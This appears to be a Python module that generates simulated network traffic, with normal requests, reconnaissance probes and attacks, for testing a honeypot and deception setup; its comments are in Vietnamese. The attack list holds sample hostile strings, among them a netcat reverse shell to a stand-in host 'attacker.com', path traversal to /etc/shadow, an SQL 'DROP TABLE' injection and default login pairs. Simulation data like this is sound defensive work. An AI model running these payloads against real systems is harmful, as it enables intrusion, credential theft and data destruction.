# network_traffic.py
import random
import time
from dataclasses import dataclass
from typing import List

@dataclass
class Connection:
    conn_id:      int
    src_ip:       str
    dst_ip:       str
    src_port:     int
    dst_port:     int
    protocol:     str
    ttl:          int
    payload:      str
    timestamp:    float
    conn_type:    str   # 'normal'/'probe'/'attack'
    is_blacklisted: bool = False

class TrafficGenerator:
    """
    Sinh lưu lượng mạng hỗn hợp:
    - Lưu lượng bình thường (HTTP requests)
    - Yêu cầu thăm dò (port scan, fingerprint)
    - Tấn công thực sự (exploit, brute force)
    """
    PRODUCTION_IP  = "192.168.1.10"   # Apache Web Server
    HONEYANOLE_IP  = "192.168.1.20"   # Honeyanole Redirector
    DECEPTION_IPS  = [
        "192.168.1.100",   # Honeyd
        "192.168.1.101",   # Honeytrap
        "192.168.1.102",   # Linux + Sebek
    ]

    def _normal_conn(self, conn_id: int) -> Connection:
        payloads = [
            "GET /index.html HTTP/1.1",
            "GET /about.html HTTP/1.1",
            "POST /api/data HTTP/1.1",
            "GET /favicon.ico HTTP/1.1",
            "GET /style.css HTTP/1.1",
        ]
        return Connection(
            conn_id   = conn_id,
            src_ip    = f"192.168.0.{random.randint(1,254)}",
            dst_ip    = self.PRODUCTION_IP,
            src_port  = random.randint(1024, 65535),
            dst_port  = 80,
            protocol  = "TCP",
            ttl       = 64,
            payload   = random.choice(payloads),
            timestamp = time.time() + random.uniform(0, 3600),
            conn_type = "normal",
        )

    def _probe_conn(self, conn_id: int) -> Connection:
        """
        Thăm dò: port scan, OS fingerprint, service detection
        → Hunter đang kiểm tra xem đây có phải honeypot không
        """
        probe_payloads = [
            "nmap -sV -O target",
            "OPTIONS * HTTP/1.0",
            "TRACE / HTTP/1.1",
            "HEAD / HTTP/1.0",
            "GET /nonexistent_page_12345 HTTP/1.1",
            "CONNECT 192.168.1.10:443 HTTP/1.1",
        ]
        return Connection(
            conn_id   = conn_id,
            src_ip    = f"{random.randint(1,223)}."
                        f"{random.randint(0,255)}."
                        f"{random.randint(0,255)}."
                        f"{random.randint(1,254)}",
            dst_ip    = self.PRODUCTION_IP,
            src_port  = random.randint(1024, 65535),
            dst_port  = random.choice([80, 443, 22, 21, 23]),
            protocol  = "TCP",
            ttl       = random.randint(50, 128),
            payload   = random.choice(probe_payloads),
            timestamp = time.time() + random.uniform(0, 3600),
            conn_type = "probe",
        )

    def _attack_conn(self, conn_id: int,
                     known_attacker: str = None) -> Connection:
        """
        Tấn công thực sự từ IP đã biết hoặc mới
        """
        attack_payloads = [
            "GET /phpMyAdmin/setup.php HTTP/1.1",
            "POST /wp-login.php admin:admin123",
            "USER root\r\nPASS toor",
            "GET /etc/passwd HTTP/1.0",
            "'; DROP TABLE users; --",
            "\x90\x90\x90 SHELLCODE_BUFFER_OVERFLOW",
            "GET /../../../etc/shadow HTTP/1.1",
            "nc -e /bin/sh attacker.com 4444",
        ]
        src = known_attacker or (
            f"{random.randint(1,223)}."
            f"{random.randint(0,255)}."
            f"{random.randint(0,255)}."
            f"{random.randint(1,254)}"
        )
        return Connection(
            conn_id   = conn_id,
            src_ip    = src,
            dst_ip    = self.PRODUCTION_IP,
            src_port  = random.randint(1024, 65535),
            dst_port  = random.choice([80, 22, 21, 23, 3306, 445]),
            protocol  = "TCP",
            ttl       = random.randint(48, 128),
            payload   = random.choice(attack_payloads),
            timestamp = time.time() + random.uniform(0, 3600),
            conn_type = "attack",
        )

    def generate(self, n: int = 100,
                 known_attackers: list = None) -> List[Connection]:
        connections = []
        known_attackers = known_attackers or []

        for i in range(1, n + 1):
            r = random.random()
            if r < 0.50:
                conn = self._normal_conn(i)
            elif r < 0.70:
                conn = self._probe_conn(i)
            elif r < 0.85:
                conn = self._attack_conn(i)
            else:
                # Tấn công từ IP đã biết trong blacklist
                if known_attackers:
                    attacker = random.choice(known_attackers)
                    conn = self._attack_conn(i, attacker)
                    conn.is_blacklisted = True
                else:
                    conn = self._attack_conn(i)
            connections.append(conn)

        connections.sort(key=lambda c: c.timestamp)
        n_types = {t: sum(1 for c in connections
                          if c.conn_type == t)
                   for t in ["normal", "probe", "attack"]}
        print(f"[Traffic] Generated {len(connections)} connections | "
              f"normal={n_types['normal']} | "
              f"probe={n_types['probe']} | "
              f"attack={n_types['attack']}")
        return connections